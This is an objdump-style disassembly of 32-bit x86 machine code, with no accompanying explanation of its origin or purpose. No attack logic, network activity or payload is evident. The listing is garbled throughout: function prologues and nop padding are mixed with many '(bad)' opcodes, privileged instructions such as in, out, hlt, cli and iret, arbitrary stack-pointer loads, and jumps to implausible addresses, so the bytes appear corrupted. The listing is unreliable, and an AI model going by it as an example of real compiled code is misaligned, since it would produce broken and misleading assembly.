  40a832:	75 0a                	jne    0x40a83e
  40a834:	1f                   	pop    %ds
  40a835:	32 a9 00 00 e9 d8    	xor    -0x27170000(%ecx),%ch
  40a83b:	00 00                	add    %al,(%eax)
  40a83d:	00 33                	add    %dh,(%ebx)
  40a83f:	c0 83 f9 01 36 95 c0 	rolb   $0xc0,-0x6ac9fe07(%ebx)
  40a846:	83 c0 20             	add    $0x20,%eax
  40a849:	38 c8                	cmp    %cl,%al
  40a84b:	00 5c 00 83          	add    %bl,-0x7d(%eax,%eax,1)
  40a84f:	f8                   	clc
  40a850:	02 75 05             	add    0x5(%ebp),%dh
  40a853:	b8 46 00 59 00       	mov    $0x590046,%eax
  40a858:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a859:	b9 c0 00 00 83       	mov    $0x830000c0,%ecx
  40a85e:	f9                   	stc
  40a85f:	01 73 0a             	add    %esi,0xa(%ebx)
  40a862:	b8 3c 00 00 00       	mov    $0x3c,%eax
  40a867:	44                   	inc    %esp
  40a868:	aa                   	stos   %al,%es:(%edi)
  40a869:	00 00                	add    %al,(%eax)
  40a86b:	00 33                	add    %dh,(%ebx)
  40a86d:	c0 83 f9 01 0f f1 c0 	rolb   $0xc0,-0xef0fe07(%ebx)
  40a874:	83 c0 3d             	add    $0x3d,%eax
  40a877:	e9 9a 00 00 00       	jmp    0x40a916
  40a87c:	8e e8                	mov    %eax,%gs
  40a87e:	06                   	push   %es
  40a87f:	f7 d3                	not    %ebx
  40a881:	1b 54 44 ec          	sbb    -0x14(%esp,%eax,2),%edx
  40a885:	83 c0 e4             	add    $0xffffffe4,%eax
  40a888:	e9 89 00 f6 00       	jmp    0x136a916
  40a88d:	7c f8                	jl     0x40a887
  40a88f:	01 75 af             	add    %esi,-0x51(%ebp)
  40a892:	a0 aa 08 41 9f       	mov    0x9f4108aa,%al
  40a897:	be 0c 63 41 11       	mov    $0x1141630c,%esi
  40a89c:	84 c0                	test   %al,%al
  40a89e:	74 3b                	je     0x40a8db
  40a8a0:	8b df                	mov    %edi,%ebx
  40a8a2:	53                   	push   %ebx
  40a8a3:	c1 40 00 a1          	roll   $0xa1,0x0(%eax)
  40a8a7:	74 c1                	je     0x40a86a
  40a8a9:	40                   	inc    %eax
  40a8aa:	00 83 38 01 58 a8    	add    %al,-0x57a7fec8(%ebx)
  40a8b0:	33 c9                	xor    %ecx,%ecx
  40a8b2:	6a 01                	push   $0x1
  40a8b4:	8a 71 51             	mov    0x51(%ecx),%dh
  40a8b7:	ff d7                	call   *%edi
  40a8b9:	83 41 08 eb          	addl   $0xffffffeb,0x8(%ecx)
  40a8bd:	11 a1 24 c1 2e 00    	adc    %esp,0x2ec124(%ecx)
  40a8c3:	33 d2                	xor    %edx,%edx
  40a8c5:	8a 16                	mov    (%esi),%dl
  40a8c7:	8b 0b                	mov    (%ebx),%ecx
  40a8c9:	12 04 51             	adc    (%ecx,%edx,2),%al
  40a8cc:	83 e0 01             	and    $0x1,%eax
  40a8cf:	85 c0                	test   %eax,%eax
  40a8d1:	75 08                	jne    0x40a8db
  40a8d3:	8a 46 d2             	mov    -0x2e(%esi),%al
  40a8d6:	46                   	inc    %esi
  40a8d7:	84 c0                	test   %al,%al
  40a8d9:	75 cb                	jne    0x40a8a6
  40a8db:	a1 00 08 41 00       	mov    0x410800,%eax
  40a8e0:	83 f8 0a             	cmp    $0xa,%eax
  40a8e3:	73 10                	jae    0x40a8f5
  40a8e5:	8a 88 33 c0 80 f9    	mov    -0x67f3fcd(%eax),%cl
  40a8eb:	71 20                	jno    0x40a90d
  40a8ed:	9d                   	popf
  40a8ee:	c0 8d 44 0b 0a dc 21 	rorb   $0x21,-0x23f5f4bc(%ebp)
  40a8f5:	10 f8                	adc    %bh,%al
  40a8f7:	5a                   	pop    %edx
  40a8f8:	73 10                	jae    0x40a90a
  40a8fa:	8a 79 33             	mov    0x33(%ecx),%bh
  40a8fd:	c0 80 f9 41 0f 9d c0 	rolb   $0xc0,-0x62f0be07(%eax)
  40a904:	8d 44 00 fd          	lea    -0x3(%eax,%eax,1),%eax
  40a908:	eb 0c                	jmp    0x40a916
  40a90a:	62 12                	bound  %edx,(%edx)
  40a90c:	00 00                	add    %al,(%eax)
  40a90e:	00 eb                	add    %ch,%bl
  40a910:	05 b8 95 98 00       	add    $0x9895b8,%eax
  40a915:	00 a3 dc 08 41 00    	add    %ah,0x4108dc(%ebx)
  40a91b:	ab                   	stos   %eax,%es:(%edi)
  40a91c:	28 08                	sub    %cl,(%eax)
  40a91e:	5f                   	pop    %edi
  40a91f:	1b 02                	sbb    (%edx),%eax
  40a921:	8b 7b dc             	mov    -0x24(%ebx),%edi
  40a924:	11 67 00             	adc    %esp,0x0(%edi)
  40a927:	33 a7 83 c9 95 0f    	xor    0xf95c983(%edi),%esp
  40a92d:	9d                   	popf
  40a92e:	29 48 a8             	sub    %ecx,-0x58(%eax)
  40a931:	25 2e 4e 00 00       	and    $0x4e2e,%eax
  40a936:	5d                   	pop    %ebp
  40a937:	41                   	inc    %ecx
  40a938:	02 90 90 90 90 90    	add    -0x6f6f6f70(%eax),%dl
  40a93e:	90                   	nop
  40a93f:	ef                   	out    %eax,(%dx)
  40a940:	55                   	push   %ebp
  40a941:	87 ec                	xchg   %ebp,%esp
  40a943:	8b 45 08             	mov    0x8(%ebp),%eax
  40a946:	b5 8b                	mov    $0x8b,%ch
  40a948:	0c 85                	or     $0x85,%al
  40a94a:	e4 08                	in     $0x8,%al
  40a94c:	41                   	inc    %ecx
  40a94d:	00 8d 83 85 e4 08    	add    %cl,0x8e48583(%ebp)
  40a953:	41                   	inc    %ecx
  40a954:	00 85 c9 75 17 8b    	add    %al,-0x74e88a37(%ebp)
  40a95a:	04 85                	add    $0x85,%al
  40a95c:	f4                   	hlt
  40a95d:	88 40 00             	mov    %al,0x0(%eax)
  40a960:	1b ff                	sbb    %edi,%edi
  40a962:	15 18 c0 40 4c       	adc    $0x4c40c018,%eax
  40a967:	85 5a 89             	test   %ebx,-0x77(%edx)
  40a96a:	06                   	push   %es
  40a96b:	75 03                	jne    0x40a970
  40a96d:	5e                   	pop    %esi
  40a96e:	5d                   	pop    %ebp
  40a96f:	c3                   	ret
  40a970:	8b 45 10             	mov    0x10(%ebp),%eax
  40a973:	85 c0                	test   %eax,%eax
  40a975:	74 0d                	je     0x40a984
  40a977:	bc 0e 50 51 ff       	mov    $0xff51500e,%esp
  40a97c:	15 c7 c0 40 00       	adc    $0x40c0c7,%eax
  40a981:	cb                   	lret
  40a982:	5d                   	pop    %ebp
  40a983:	c3                   	ret
  40a984:	c7                   	(bad)
  40a985:	55                   	push   %ebp
  40a986:	0c 13                	or     $0x13,%al
  40a988:	06                   	push   %es
  40a989:	52                   	push   %edx
  40a98a:	50                   	push   %eax
  40a98b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a98c:	15 1c c0 40 00       	adc    $0x40c01c,%eax
  40a991:	5e                   	pop    %esi
  40a992:	5d                   	pop    %ebp
  40a993:	c3                   	ret
  40a994:	90                   	nop
  40a995:	90                   	nop
  40a996:	f7 43 90 d8 72 90 90 	testl  $0x909072d8,-0x70(%ebx)
  40a99d:	3a de                	cmp    %dh,%bl
  40a99f:	90                   	nop
  40a9a0:	55                   	push   %ebp
  40a9a1:	24 4b                	and    $0x4b,%al
  40a9a3:	83 ec 14             	sub    $0x14,%esp
  40a9a6:	b0 56                	mov    $0x56,%al
  40a9a8:	57                   	push   %edi
  40a9a9:	8b 00                	mov    (%eax),%eax
  40a9ab:	0c 8b                	or     $0x8b,%al
  40a9ad:	17                   	pop    %ss
  40a9ae:	85 ce                	test   %ecx,%esi
  40a9b0:	e2 55                	loop   0x40aa07
  40a9b2:	f8                   	clc
  40a9b3:	75 93                	jne    0x40a948
  40a9b5:	5f                   	pop    %edi
  40a9b6:	5e                   	pop    %esi
  40a9b7:	33 c0                	xor    %eax,%eax
  40a9b9:	2f                   	das
  40a9ba:	8b 56 5d             	mov    0x5d(%esi),%edx
  40a9bd:	c2 18 00             	ret    $0x18
  40a9c0:	46                   	inc    %esi
  40a9c1:	55                   	push   %ebp
  40a9c2:	f8                   	clc
  40a9c3:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40a9c6:	83 39 00             	cmpl   $0x0,(%ecx)
  40a9c9:	74 ea                	je     0x40a9b5
  40a9cb:	39 75 08             	cmp    %esi,0x8(%ebp)
  40a9ce:	33 c0                	xor    %eax,%eax
  40a9d0:	8a 06                	mov    (%esi),%al
  40a9d2:	46                   	inc    %esi
  40a9d3:	84 c0                	test   %al,%al
  40a9d5:	89 75 ca             	mov    %esi,-0x36(%ebp)
  40a9d8:	78 19                	js     0x40a9f3
  40a9da:	4a                   	dec    %edx
  40a9db:	89 05 8b 11 4a 66    	mov    %eax,0x664a118b
  40a9e1:	11 8b 4d d2 66 89    	adc    %ecx,-0x76992db3(%ebx)
  40a9e7:	01 95 c1 02 89 4d    	add    %edx,0x4d8902c1(%ebp)
  40a9ed:	10 e9                	adc    %ch,%cl
  40a9ef:	16                   	push   %ss
  40a9f0:	01 00                	add    %eax,(%eax)
  40a9f2:	00 8b c8 24 82 c0    	add    %cl,-0x3f7ddb38(%ebx)
  40a9f8:	00 00                	add    %al,(%eax)
  40a9fa:	00 80 f9 c0 de 85    	add    %al,-0x7a213f07(%eax)
  40aa00:	c1 8c 00 00 99 bf d6 	rorl   $0x0,-0x29406700(%eax,%eax,1)
  40aa07:	00 
  40aa08:	28 00                	sub    %al,(%eax)
  40aa0a:	8b cf                	mov    %edi,%ecx
  40aa0c:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40aa0f:	23 cf                	and    %edi,%ecx
  40aa11:	38 db                	cmp    %bl,%bl
  40aa13:	04 70                	add    $0x70,%al
  40aa15:	00 b0 00 33 d2 3b    	add    %dh,0x3bd23300(%eax)
  40aa1b:	ec                   	in     (%dx),%al
  40aa1c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40aa1f:	89 45 36             	mov    %eax,0x36(%ebp)
  40aa22:	75 34                	jne    0x40aa58
  40aa24:	3b 2b                	cmp    (%ebx),%ebp
  40aa26:	75 30                	jne    0x40aa58
  40aa28:	8b c7                	mov    %edi,%eax
  40aa2a:	8b ce                	mov    %esi,%ecx
  40aa2c:	b9 01 80 00 00       	mov    $0x8001,%ecx
  40aa31:	e8 da 0d 1f 00       	call   0x5fb810
  40aa36:	0b f8                	or     %eax,%edi
  40aa38:	0b da                	or     %edx,%ebx
  40aa3a:	46                   	inc    %esi
  40aa3b:	90                   	nop
  40aa3c:	fe                   	(bad)
  40aa3d:	b9 89 75 fc 77       	mov    $0x77fc7589,%ecx
  40aa42:	48                   	dec    %eax
  40aa43:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40aa46:	c3                   	ret
  40aa47:	4d                   	dec    %ebp
  40aa48:	f0 3e c7             	lock ds (bad)
  40aa4b:	f9                   	stc
  40aa4c:	cb                   	lret
  40aa4d:	3b c7                	cmp    %edi,%eax
  40aa4f:	75 04                	jne    0x40aa55
  40aa51:	3b cb                	cmp    %ebx,%ecx
  40aa53:	74 87                	je     0x40a9dc
  40aa55:	8b 45 77             	mov    0x77(%ebp),%eax
  40aa58:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40aa5b:	8b cb                	mov    %ebx,%ecx
  40aa5d:	10 d1                	adc    %dl,%cl
  40aa5f:	8b f7                	mov    %edi,%esi
  40aa61:	23 ca                	and    %edx,%ecx
  40aa63:	8b 35 fc f7 d6 fc    	mov    0xfcd6f7fc,%esi
  40aa69:	43                   	inc    %ebx
  40aa6a:	8d 42 01             	lea    0x1(%edx),%eax
  40aa6d:	89 b8 f4 8b 45 7b    	mov    %edi,0x7b458bf4(%eax)
  40aa73:	3b c2                	cmp    %edx,%eax
  40aa75:	0f f2 59 01          	pslld  0x1(%ecx),%mm3
  40aa79:	00 00                	add    %al,(%eax)
  40aa7b:	34 fa                	xor    $0xfa,%al
  40aa7d:	01 a0 6e bd 17 83    	add    %esp,-0x7ce84292(%eax)
  40aa83:	e0 1e                	loopne 0x40aaa3
  40aa85:	33 ff                	xor    %edi,%edi
  40aa87:	ef                   	out    %eax,(%dx)
  40aa88:	c7 45 67 5f 5e b8 16 	movl   $0x16b85e5f,0x67(%ebp)
  40aa8f:	00 be 00 c3 8b e5    	add    %bh,-0x1a743d00(%esi)
  40aa95:	4b                   	dec    %ebx
  40aa96:	c2 cf 6e             	ret    $0x6ecf
  40aa99:	0b c1                	or     %ecx,%eax
  40aa9b:	75 1e                	jne    0x40aabb
  40aa9d:	8b 55 08             	mov    0x8(%ebp),%edx
  40aaa0:	0f a4 fb 01          	shld   $0x1,%edi,%ebx
  40aaa4:	8a 02                	mov    (%edx),%al
  40aaa6:	ad                   	lods   %ds:(%esi),%eax
  40aaa7:	ff 24 3f             	jmp    *(%edi,%edi,1)
  40aaaa:	25 ff 00 00 00       	and    $0xff,%eax
  40aaaf:	99                   	cltd
  40aab0:	dc 20                	fsubl  (%eax)
  40aab2:	23 d3                	and    %ebx,%edx
  40aab4:	0b ba 74 c2 8b 93    	or     -0x6c743d8c(%edx),%edi
  40aaba:	81 83 fa 02 75 11 76 	addl   $0x750dfe76,0x117502fa(%ebx)
  40aac1:	fe 0d 75 
  40aac4:	0d 85 17 75 29       	or     $0x29751785,%eax
  40aac9:	4b                   	dec    %ebx
  40aaca:	45                   	inc    %ebp
  40aacb:	08 f6                	or     %dh,%dh
  40aacd:	00 20                	add    %ah,(%eax)
  40aacf:	eb de                	jmp    0x40aaaf
  40aad1:	83 fa 03             	cmp    $0x3,%edx
  40aad4:	75 1c                	jne    0x40aaf2
  40aad6:	85 c9                	test   %ecx,%ecx
  40aad8:	7f f1                	jg     0x40aacb
  40aada:	7c 05                	jl     0x40aae1
  40aadc:	83 fe 04             	cmp    $0x4,%esi
  40aadf:	77 aa                	ja     0x40aa8b
  40aae1:	83 83 f0 75 0c 85 04 	addl   $0x4,-0x7af38a10(%ebx)
  40aae8:	75 08                	jne    0x40aaf2
  40aaea:	8b f1                	mov    %ecx,%esi
  40aaec:	08 f6                	or     %dh,%dh
  40aaee:	00 30                	add    %dh,(%eax)
  40aaf0:	75 99                	jne    0x40aa8b
  40aaf2:	8b 7d 14             	mov    0x14(%ebp),%edi
  40aaf5:	b8 ad 43 00 00       	mov    $0x43ad,%eax
  40aafa:	d1 c2                	rol    $1,%edx
  40aafc:	8b 1f                	mov    (%edi),%ebx
  40aafe:	1b c0                	sbb    %eax,%eax
  40ab00:	d7                   	xlat   %ds:(%ebx)
  40ab01:	9b                   	fwait
  40ab02:	40                   	inc    %eax
  40ab03:	3b d8                	cmp    %eax,%ebx
  40ab05:	0f 82 ef fe ff ff    	jb     0x40a9fa
  40ab0b:	d5 d2                	aad    $0xd2
  40ab0d:	74 d8                	je     0x40aae7
  40ab0f:	8b 7d 08             	mov    0x8(%ebp),%edi
  40ab12:	eb 9d                	jmp    0x40aab1
  40ab14:	8b 55 b2             	mov    -0x4e(%ebp),%edx
  40ab17:	33 c0                	xor    %eax,%eax
  40ab19:	4a                   	dec    %edx
  40ab1a:	8a 07                	mov    (%edi),%al
  40ab1c:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40ab1f:	8b d0                	mov    %eax,%edx
  40ab21:	e0 e2                	loopne 0x40ab05
  40ab23:	c0 00 00             	rolb   $0x0,(%eax)
  40ab26:	88 47 80             	mov    %al,-0x80(%edi)
  40ab29:	fa                   	cli
  40ab2a:	80 89 d8 08 0f 07 57 	orb    $0x57,0x70f08d8(%ecx)
  40ab31:	ff                   	(bad)
  40ab32:	ff 45 0f             	incl   0xf(%ebp)
  40ab35:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40ab36:	f1                   	int1
  40ab37:	06                   	push   %es
  40ab38:	24 e0                	and    $0xe0,%al
  40ab3a:	3f                   	aas
  40ab3b:	99                   	cltd
  40ab3c:	c1 e6 06             	shl    $0x6,%esi
  40ab3f:	f0 c6                	lock (bad)
  40ab41:	0b d1                	or     %ecx,%edx
  40ab43:	8b f0                	mov    %eax,%esi
  40ab45:	8b 80 fc b4 c0 8b    	mov    -0x743f4b04(%eax),%eax
  40ab4b:	ca 75 c6             	lret   $0xc675
  40ab4e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40ab51:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40ab54:	2b c2                	sub    %edx,%eax
  40ab56:	8b d6                	mov    %esi,%edx
  40ab58:	0c 85                	or     $0x85,%al
  40ab5a:	98                   	cwtl
  40ab5b:	08 02                	or     %al,(%edx)
  40ab5d:	7f 17                	jg     0x40ab76
  40ab5f:	7c 08                	jl     0x40ab69
  40ab61:	f5                   	cmc
  40ab62:	fe                   	(bad)
  40ab63:	15 00 01 00 73       	adc    $0x73000100,%eax
  40ab68:	0d 5b 45 14 8b       	or     $0x8b14455b,%eax
  40ab6d:	10 66 89             	adc    %ah,-0x77(%esi)
  40ab70:	10 9a 2e 97 eb 3c    	adc    %bl,0x3ceb972e(%edx)
  40ab76:	85 45 14             	test   %eax,0x14(%ebp)
  40ab79:	11 18                	adc    %ebx,(%eax)
  40ab7b:	83 c3 fe             	add    $0xfffffffe,%ebx
  40ab7e:	81 92 00 00 ff 22 83 	adcl   $0x89ff6f83,0x22ff0000(%edx)
  40ab85:	6f ff 89 
  40ab88:	18 8b d1 8b c6 15    	sbb    %cl,0x15c68bd1(%ebx)
  40ab8e:	ea 00 00 00 77 79 7a 	ljmp   $0x7a79,$0x77000000
  40ab95:	00 00                	add    %al,(%eax)
  40ab97:	d9 8b c8 50 45 f0    	(bad) -0xfbaaf38(%ebx)
  40ab9d:	2f                   	das
  40ab9e:	cd d8                	int    $0xd8
  40aba0:	81 e6 54 03 00 06    	and    $0x6000354,%esi
  40aba6:	66 89 08             	mov    %cx,(%eax)
  40aba9:	83 72 02 06          	xorl   $0x6,0x2(%edx)
  40abad:	ce                   	into
  40abae:	00 dc                	add    %bl,%ah
  40abb0:	00 00                	add    %al,(%eax)
  40abb2:	b5 89                	mov    $0x89,%ch
  40abb4:	30 f8                	xor    %bh,%al
  40abb6:	c0 02 89             	rolb   $0x89,(%edx)
  40abb9:	45                   	inc    %ebp
  40abba:	10 8b 7d 0c 8b 07    	adc    %cl,0x78b0c7d(%ebx)
  40abc0:	85 c0                	test   %eax,%eax
  40abc2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40abc5:	0f 85 f5 fd ff ff    	jne    0x40a9c0
  40abcb:	5f                   	pop    %edi
  40abcc:	5e                   	pop    %esi
  40abcd:	0c 8b                	or     $0x8b,%al
  40abcf:	e5 5d                	in     $0x5d,%eax
  40abd1:	c2 10 00             	ret    $0x10
  40abd4:	fc                   	cld
  40abd5:	5e                   	pop    %esi
  40abd6:	b8 2d 11 01 00       	mov    $0x1112d,%eax
  40abdb:	5b                   	pop    %ebx
  40abdc:	8b e5                	mov    %ebp,%esp
  40abde:	47                   	inc    %edi
  40abdf:	c2 db 00             	ret    $0xdb
  40abe2:	90                   	nop
  40abe3:	08 41 7b             	or     %al,0x7b(%ecx)
  40abe6:	bc 90 57 90 90       	mov    $0x90905790,%esp
  40abeb:	96                   	xchg   %eax,%esi
  40abec:	90                   	nop
  40abed:	1b 90 90 55 8b ec    	sbb    -0x1374aa70(%eax),%edx
  40abf3:	83 ec de             	sub    $0xffffffde,%esp
  40abf6:	8b 55 0c             	mov    0xc(%ebp),%edx
  40abf9:	53                   	push   %ebx
  40abfa:	56                   	push   %esi
  40abfb:	57                   	push   %edi
  40abfc:	8b 3a                	mov    (%edx),%edi
  40abfe:	85 57 89             	test   %edx,-0x77(%edi)
  40ac01:	7d fc                	jge    0x40abff
  40ac03:	75 4f                	jne    0x40ac54
  40ac05:	5f                   	pop    %edi
  40ac06:	5e                   	pop    %esi
  40ac07:	33 82 5b 8b 79 5d    	xor    0x5d798b5b(%edx),%eax
  40ac0d:	c2 10 00             	ret    $0x10
  40ac10:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40ac13:	8b 96 14 83 38 00    	mov    0x388314(%esi),%edx
  40ac19:	74 d0                	je     0x40abeb
  40ac1b:	8b 75 08             	mov    0x8(%ebp),%esi
  40ac1e:	33 09                	xor    (%ecx),%ecx
  40ac20:	66 8b 0e             	mov    (%esi),%cx
  40ac23:	83 8d 02 81 f9 80 00 	orl    $0x0,-0x7f067efe(%ebp)
  40ac2a:	00 00                	add    %al,(%eax)
  40ac2c:	89 75 42             	mov    %esi,0x42(%ebp)
  40ac2f:	7d 16                	jge    0x40ac47
  40ac31:	4f                   	dec    %edi
  40ac32:	89 3a                	mov    %edi,(%edx)
  40ac34:	8b 30                	mov    (%eax),%esi
  40ac36:	4e                   	dec    %esi
  40ac37:	89 30                	mov    %esi,(%eax)
  40ac39:	8b 45 10             	mov    0x10(%ebp),%eax
  40ac3c:	45                   	inc    %ebp
  40ac3d:	08 40 89             	or     %al,-0x77(%eax)
  40ac40:	45                   	inc    %ebp
  40ac41:	10 e9                	adc    %ch,%cl
  40ac43:	0a 01                	or     (%ecx),%al
  40ac45:	00 00                	add    %al,(%eax)
  40ac47:	04 c1                	add    $0xc1,%al
  40ac49:	25 00 fc 00 00       	and    $0xfc00,%eax
  40ac4e:	3d 15 dc 00 00       	cmp    $0xdc15,%eax
  40ac53:	0f 84 1c 01 00 00    	je     0x40ad75
  40ac59:	3d 00 d8 1a 00       	cmp    $0x1ad800,%eax
  40ac5e:	75 46                	jne    0x40aca6
  40ac60:	fa                   	cli
  40ac61:	ff                   	lcall  (bad)
  40ac62:	df 0f                	fisttps (%edi)
  40ac64:	bf fe 00 00 00       	mov    $0xfe,%edi
  40ac69:	66 8b 06             	mov    (%esi),%ax
  40ac6c:	8b d0                	mov    %eax,%edx
  40ac6e:	cf                   	iret
  40ac6f:	e2 c4                	loop   0x40ac35
  40ac71:	fc                   	cld
  40ac72:	00 13                	add    %dl,(%ebx)
  40ac74:	63 fa                	arpl   %edi,%edx
  40ac76:	00 dc                	add    %bl,%ah
  40ac78:	00 00                	add    %al,(%eax)
  40ac7a:	6c                   	insb   (%dx),%es:(%edi)
  40ac7b:	85 f5                	test   %esi,%ebp
  40ac7d:	00 00                	add    %al,(%eax)
  40ac7f:	00 c5                	add    %al,%ch
  40ac81:	8c ff                	mov    %?,%edi
  40ac83:	03 00                	add    (%eax),%eax
  40ac85:	00 25 ff 03 00 00    	add    %ah,0x3ff
  40ac8b:	c1 e1 0a             	shl    $0xa,%ecx
  40ac8e:	0b c1                	or     %ecx,%eax
  40ac90:	83 c6 02             	add    $0x2,%esi
  40ac93:	99                   	cltd
  40ac94:	8b f4                	mov    %esp,%esi
  40ac96:	4d                   	dec    %ebp
  40ac97:	4a                   	dec    %edx
  40ac98:	81 c3 00 e5 01 7a    	add    $0x7a01e500,%ebx
  40ac9e:	89 75 08             	mov    %esi,0x8(%ebp)
  40aca1:	87 d7                	xchg   %edx,%edi
  40aca3:	00 ef                	add    %ch,%bh
  40aca5:	07                   	pop    %es
  40aca6:	8b c1                	mov    %ecx,%eax
  40aca8:	99                   	cltd
  40aca9:	8b d8                	mov    %eax,%ebx
  40acab:	8b 5a 8b             	mov    -0x75(%edx),%ebx
  40acae:	c3                   	ret
  40acaf:	8b d7                	mov    %edi,%edx
  40acb1:	b9 15 4e 00 00       	mov    $0x4e15,%ecx
  40acb6:	e8 4e 0b 00 00       	call   0x40b809
  40acbb:	8b b1 be 01 01 00    	mov    0x101be(%ecx),%esi
  40acc1:	00 09                	add    %cl,(%ecx)
  40acc3:	ca 74 11             	lret   $0x1174
  40acc6:	b9 05 00 00 00       	mov    $0x5,%ecx
  40accb:	15 40 0b 00 2e       	adc    $0x2e000b40,%eax
  40acd0:	8b c6                	mov    %esi,%eax
  40acd2:	ec                   	in     (%dx),%al
  40acd3:	49                   	dec    %ecx
  40acd4:	ca 75 ef             	lret   $0xef75
  40acd7:	8b 55 76             	mov    0x76(%ebp),%edx
  40acda:	5e                   	pop    %esi
  40acdb:	48                   	dec    %eax
  40acdc:	0f 4b 23             	cmovnp (%ebx),%esp
  40acdf:	ff 8f ff b8 02 00    	decl   0x2b8ff(%edi)
  40ace5:	00 da                	add    %bl,%dl
  40ace7:	8b 55 0c             	mov    0xc(%ebp),%edx
  40acea:	7f c6                	jg     0x40acb2
  40acec:	8b 45 cd             	mov    -0x33(%ebp),%eax
  40acef:	1b c9                	sbb    %ecx,%ecx
  40acf1:	f7 d9                	neg    %ecx
  40acf3:	2b c1                	sub    %ecx,%eax
  40acf5:	83 c9 ff             	or     $0xffffffff,%ecx
  40acf8:	48                   	dec    %eax
  40acf9:	2b ce                	sub    %esi,%ecx
  40acfb:	89 ba 8b 45 2c 8b    	mov    %edi,-0x74d3ba75(%edx)
  40ad01:	10 03                	adc    %al,(%ebx)
  40ad03:	d1 89 10 8b 55 fc    	rorl   $1,-0x3aa74f0(%ecx)
  40ad09:	85 f6                	test   %esi,%esi
  40ad0b:	e1 4c                	loope  0x40ad59
  40ad0d:	eb 01                	jmp    0x40ad10
  40ad0f:	b8 5e 00 00 d5       	mov    $0xd500005e,%eax
  40ad14:	89 4d aa             	mov    %ecx,-0x56(%ebp)
  40ad17:	fb                   	sti
  40ad18:	30 8b d0 d1 fa 72    	xor    %cl,0x72fad1d0(%ebx)
  40ad1e:	c2 49 58             	ret    $0x5849
  40ad21:	45                   	inc    %ebp
  40ad22:	fc                   	cld
  40ad23:	e9 c3 69 3f 89       	jmp    0x898016eb
  40ad28:	4d                   	dec    %ebp
  40ad29:	f8                   	clc
  40ad2a:	0c 80                	or     $0x80,%al
  40ad2c:	ae                   	scas   %es:(%edi),%al
  40ad2d:	d7                   	xlat   %ds:(%ebx)
  40ad2e:	88 01                	mov    %al,(%ecx)
  40ad30:	2f                   	das
  40ad31:	c3                   	ret
  40ad32:	b9 95 da 00 59       	mov    $0x5900da95,%ecx
  40ad37:	a2 d4 fb 00 00       	mov    %al,0xfbd4
  40ad3c:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40ad3f:	8b d8                	mov    %eax,%ebx
  40ad41:	ea 45 fc 4e 0a 68 75 	ljmp   $0x7568,$0xa4efc45
  40ad48:	d0 8b 55 0c 0a d8    	rorb   $1,-0x27f5f3ab(%ebx)
  40ad4e:	88 59 ff             	mov    %bl,-0x1(%ecx)
  40ad51:	8b 02                	mov    (%edx),%eax
  40ad53:	50                   	push   %eax
  40ad54:	c0 89 ab fc 0f 85 b2 	rorb   $0xb2,-0x7af00355(%ecx)
  40ad5b:	09 ff                	or     %edi,%edi
  40ad5d:	ff 5f 5e             	lcall  *0x5e(%edi)
  40ad60:	5b                   	pop    %ebx
  40ad61:	ef                   	out    %eax,(%dx)
  40ad62:	7c 5d                	jl     0x40adc1
  40ad64:	c2 10 00             	ret    $0x10
  40ad67:	5f                   	pop    %edi
  40ad68:	5e                   	pop    %esi
  40ad69:	cb                   	lret
  40ad6a:	78 11                	js     0x40ad7d
  40ad6c:	01 4f 5b             	add    %ecx,0x5b(%edi)
  40ad6f:	e2 e5                	loop   0x40ad56
  40ad71:	5d                   	pop    %ebp
  40ad72:	c2 10 00             	ret    $0x10
  40ad75:	5f                   	pop    %edi
  40ad76:	5e                   	pop    %esi
  40ad77:	b8 16 00 00 00       	mov    $0x16,%eax
  40ad7c:	5b                   	pop    %ebx
  40ad7d:	d0 e5                	shl    $1,%ch
  40ad7f:	5d                   	pop    %ebp
  40ad80:	8f                   	(bad)
  40ad81:	10 00                	adc    %al,(%eax)
  40ad83:	90                   	nop
  40ad84:	90                   	nop
  40ad85:	90                   	nop
  40ad86:	90                   	nop
  40ad87:	90                   	nop
  40ad88:	90                   	nop
  40ad89:	90                   	nop
  40ad8a:	90                   	nop
  40ad8b:	90                   	nop
  40ad8c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad8d:	90                   	nop
  40ad8e:	90                   	nop
  40ad8f:	90                   	nop
  40ad90:	55                   	push   %ebp
  40ad91:	8b ec                	mov    %esp,%ebp
  40ad93:	8b 45 59             	mov    0x59(%ebp),%eax
  40ad96:	83 e8 02             	sub    $0x2,%eax
  40ad99:	74 10                	je     0x40adab
  40ad9b:	ff 15 ad fb 40 00    	call   *0x40fbad
  40ada1:	10 00                	adc    %al,(%eax)
  40ada3:	3f                   	aas
  40ada4:	27                   	daa
  40ada5:	00 00                	add    %al,(%eax)
  40ada7:	33 c1                	xor    %ecx,%eax
  40ada9:	5d                   	pop    %ebp
  40adaa:	64 8b 45 14          	mov    %fs:0x14(%ebp),%eax
  40adae:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40adb1:	8b 55 4c             	mov    0x4c(%ebp),%edx
  40adb4:	50                   	push   %eax
  40adb5:	51                   	push   %ecx
  40adb6:	52                   	push   %edx
  40adb7:	e8 14 20 00 00       	call   0x40cdd0
  40adbc:	83 9a 0c 5d 6a 90 90 	sbbl   $0xffffff90,-0x6f95a2f4(%edx)
  40adc3:	59                   	pop    %ecx
  40adc4:	90                   	nop
  40adc5:	90                   	nop
  40adc6:	90                   	nop
  40adc7:	90                   	nop
  40adc8:	90                   	nop
  40adc9:	ec                   	in     (%dx),%al
  40adca:	90                   	nop
  40adcb:	13 1b                	adc    (%ebx),%ebx
  40adcd:	90                   	nop
  40adce:	90                   	nop
  40adcf:	90                   	nop
  40add0:	55                   	push   %ebp
  40add1:	8b ec                	mov    %esp,%ebp
  40add3:	8b 45 10             	mov    0x10(%ebp),%eax
  40add6:	71 4d                	jno    0x40ae25
  40add8:	0c c4                	or     $0xc4,%al
  40adda:	26 10 73 b5          	adc    %dh,%es:-0x4b(%ebx)
  40adde:	ff 15 2c c1 40 00    	call   *0x40c12c
